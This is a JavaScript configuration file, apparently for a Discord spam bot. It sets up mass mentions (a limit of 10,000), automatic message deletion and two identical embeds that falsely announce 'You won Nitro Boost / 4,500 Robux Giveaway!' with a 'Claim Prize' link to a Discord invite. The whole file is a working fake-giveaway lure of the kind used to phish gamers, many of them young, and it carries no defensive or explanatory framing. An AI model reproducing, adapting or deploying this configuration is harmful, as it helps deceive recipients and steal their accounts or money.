module.exports = {
    token: process.env.token,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,

    embed: [
        {
            embed: {
                title: "Congratulations! You won Nitro Boost / 4,500 Robux Giveaway!",
                description: "**Nitro Boost + 4,500 Robux**\n\nEnds in: 07.07.2026\nHosted by: BloxFruits Admin\nEntries: 392\nWinners: 🥳・You! \n\nClick the button below to claim your prize!\n\n**[Claim Prize](https://discord.gg/tyVzXDNjre)**",
                color: 0x5865F2,
                image: {
                    url: "https://cdn.discordapp.com/attachments/1521433320918093944/1525770745651789885/IMG_0273.png?ex=6a54983d&is=6a5346bd&hm=3813272c23f349f6c2ab86a69c31e6ad5503997f5701ada604dfd3d0285ff0d6&"
                }
            }
        }
    ],

    embed2: [
        {
            embed: {
                title: "Congratulations! You won Nitro Boost / 4,500 Robux Giveaway!",
                description: "**Nitro Boost + 4,500 Robux**\n\nEnds in: 07.07.2026\nHosted by: BloxFruits Admin\nEntries: 392\nWinners: 🥳・You! \n\nClick the button below to claim your prize!\n\n**[Claim Prize](https://discord.gg/tyVzXDNjre)**",
                color: 0x5865F2,
                image: {
                    url: "https://cdn.discordapp.com/attachments/1521433320918093944/1525770745651789885/IMG_0273.png?ex=6a54983d&is=6a5346bd&hm=3813272c23f349f6c2ab86a69c31e6ad5503997f5701ada604dfd3d0285ff0d6&"
                }
            }
        }
    ]
};
